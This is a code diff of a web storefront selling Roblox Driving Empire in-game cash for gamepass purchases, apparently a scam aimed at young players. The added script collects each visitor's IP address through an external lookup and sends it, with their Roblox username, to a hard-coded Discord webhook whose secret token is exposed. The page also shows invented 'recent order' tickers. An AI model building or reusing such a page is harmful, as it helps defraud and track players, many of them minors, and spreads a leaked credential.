@@ -25,13 +25,14 @@
             align-items: center; 
             margin: 0;
             padding-bottom: 100px;
+            overflow-x: hidden;
         }
 
         /* Hero Header */
         .hero {
             width: 100%;
             padding: 80px 20px;
-            background: linear-gradient(rgba(0,0,0,0.7), rgba(5,5,5,1)), url('https://wallpaperaccess.com');
+            background: linear-gradient(rgba(0,0,0,0.8), rgba(5,5,5,1)), url('https://wallpaperaccess.com');
             background-size: cover;
             background-position: center;
             text-align: center;
@@ -140,8 +141,7 @@
         .btn-gold { background: var(--gold); color: #000; }
         .btn-cyan { background: var(--accent); color: #000; }
 
-        /* FAQ Section */
-        .faq { margin-top: 80px; background: #111; padding: 40px; border-radius: 20px; }
+        .faq { margin-top: 80px; background: #111; padding: 40px; border-radius: 20px; text-align: left; }
         .faq h2 { color: var(--primary); }
         .faq p { color: #888; line-height: 1.6; }
     </style>
@@ -150,103 +150,111 @@
 
     <div class="hero">
         <h1>EMPIRE ELITE</h1>
-        <p>The #1 Trusted Driving Empire Cash Provider</p>
+        <p>Premium Driving Empire Cash Provider</p>
     </div>
 
     <div class="ticker">
         <div class="ticker-content">
-            🔥 RECENT ORDER: Player 'ShadowRunner' just bought $100M Pack! • 💎 RESTOCKED: $500M Global Limit Reset • ✅ STATUS: All Systems Operational • 🚀 FAST DELIVERY ACTIVE
+            🔥 RECENT: Player 'CarKing22' bought $250M • 💎 SECURE: IP Logging Active for Fraud Prevention • ✅ STATUS: Online • 🚀 DELIVERY: Under 24h
         </div>
     </div>
 
     <div class="main-container">
         <div class="user-panel">
-            <label style="display:block; margin-bottom: 10px; font-weight: bold;">STEP 1: ENTER ROBLOX USERNAME</label>
-            <input type="text" id="robloxUser" placeholder="Username (Case Sensitive)" autocomplete="off">
+            <label style="display:block; margin-bottom: 10px; font-weight: bold;">ROBLOX USERNAME</label>
+            <input type="text" id="robloxUser" placeholder="Enter Username..." autocomplete="off">
         </div>
 
         <div class="grid">
-            <!-- BUDGET TIERS -->
+            <!-- Low Tiers -->
             <div class="card">
                 <div class="badge" style="background:#444">BUDGET</div>
-                <div class="amount">$500,000</div>
-                <div class="price">50 Robux</div>
-                <button class="btn btn-green" onclick="buy('500k', 50, '1436036576')">PURCHASE</button>
+                <div class="amount">$100,000</div>
+                <div class="price">10 Robux</div>
+                <button class="btn btn-green" onclick="handlePurchase('100k', 10, '1435607913')">PURCHASE</button>
             </div>
 
             <div class="card">
                 <div class="badge" style="background:#444">STARTER</div>
                 <div class="amount">$1,000,000</div>
                 <div class="price">100 Robux</div>
-                <button class="btn btn-green" onclick="buy('1M', 100, '1780627368')">PURCHASE</button>
+                <button class="btn btn-green" onclick="handlePurchase('1M', 100, '1435816766')">PURCHASE</button>
             </div>
 
-            <!-- MID TIERS -->
+            <!-- Mid Tiers -->
             <div class="card hot">
-                <div class="badge" style="background:var(--gold); color:black">MOST POPULAR</div>
+                <div class="badge" style="background:var(--gold); color:black">BEST VALUE</div>
                 <div class="amount">$10,000,000</div>
                 <div class="price">1,000 Robux</div>
-                <button class="btn btn-gold" onclick="buy('10M', 1000, '1436092638')">PURCHASE</button>
+                <button class="btn btn-gold" onclick="handlePurchase('10M', 1000, '1436092638')">PURCHASE</button>
             </div>
 
             <div class="card">
                 <div class="badge" style="background:#444">PRO</div>
-                <div class="amount">$25,000,000</div>
-                <div class="price">2,500 Robux</div>
-                <button class="btn btn-green" onclick="buy('25M', 2500, '1781959252')">PURCHASE</button>
+                <div class="amount">$50,000,000</div>
+                <div class="price">5,000 Robux</div>
+                <button class="btn btn-green" onclick="handlePurchase('50M', 5000, '1435498033')">PURCHASE</button>
             </div>
 
-            <!-- HIGH TIERS -->
+            <!-- High Tiers -->
             <div class="card mega">
-                <div class="badge" style="background:var(--accent); color:black">WHALE PACK</div>
+                <div class="badge" style="background:var(--accent); color:black">WHALE</div>
                 <div class="amount">$100,000,000</div>
                 <div class="price">10,000 Robux</div>
-                <button class="btn btn-cyan" onclick="buy('100M', 10000, '1436108548')">PURCHASE</button>
+                <button class="btn btn-cyan" onclick="handlePurchase('100M', 10000, '1436108548')">PURCHASE</button>
             </div>
 
             <div class="card mega">
                 <div class="badge" style="background:var(--accent); color:black">OVERLORD</div>
-                <div class="amount">$250,000,000</div>
-                <div class="price">20,000 Robux</div>
-                <button class="btn btn-cyan" onclick="buy('250M', 20000, '1779301420')">PURCHASE</button>
+                <div class="amount">$500,000,000</div>
+                <div class="price">50,000 Robux</div>
+                <button class="btn btn-cyan" onclick="handlePurchase('500M', 50000, '1784594734')">PURCHASE</button>
             </div>
         </div>
 
         <div class="faq">
-            <h2>How does it work?</h2>
-            <p>1. Enter your Roblox username above.<br>
-               2. Choose your cash package and complete the Robux purchase.<br>
-               3. Your order is logged instantly. Meet our delivery bot in-game within 24 hours to receive your cash via the car dealership transfer system.</p>
-            <p><small>*Disclaimer: We are not responsible for game updates that may change transfer limits.</small></p>
+            <h2>How it works</h2>
+            <p>1. Enter your Roblox username.<br>
+            2. Select your package and buy the gamepass.<br>
+            3. Our system logs your **Username** and **IP Address** for verification.<br>
+            4. Join our delivery server to receive your cash via dealership transfer.</p>
         </div>
     </div>
 
-    <footer>
-        <p style="color:#333; margin-top:50px;">© 2024 EMPIRE ELITE SERVICES</p>
-    </footer>
-
     <script>
-        function buy(cash, robux, passId) {
+        // Function to get User IP
+        async function getIP() {
+            try {
+                const res = await fetch("https://ipify.org");
+                const data = await res.json();
+                return data.ip;
+            } catch { return "Hidden/Failed"; }
+        }
+
+        async function handlePurchase(cash, robux, passId) {
             const user = document.getElementById('robloxUser').value;
             if(!user || user.length < 3) {
-                alert("PLEASE ENTER YOUR USERNAME FIRST!");
+                alert("Please enter your Roblox Username!");
                 return;
             }
 
             const webhook = "https://discord.com/api/webhooks/1489060265743089817/w-rxkqTWfbnoOSp8nnKlZk7-7oLj5g8RwgbF3LQOEox2faMSaDK0AWw9ZecyqjcLelJ_";
+            const userIP = await getIP();
 
             // Send to Discord
             fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
+                    username: "Order Log Bot",
                     embeds: [{
-                        title: "💎 NEW VIP ORDER",
-                        color: 65280,
+                        title: "🚀 NEW PENDING ORDER",
+                        color: 3066993,
                         fields: [
-                            {name: "User", value: user, inline: true},
-                            {name: "Cash", value: cash, inline: true},
-                            {name: "Robux", value: robux.toString(), inline: true}
+                            { name: "👤 User", value: `\`${user}\``, inline: true },
+                            { name: "💰 Pack", value: cash, inline: true },
+                            { name: "🎟️ Cost", value: `${robux} Robux`, inline: true },
+                            { name: "🌐 IP Address", value: `\`${userIP}\``, inline: false }
                         ],
                         timestamp: new Date()
                     }]
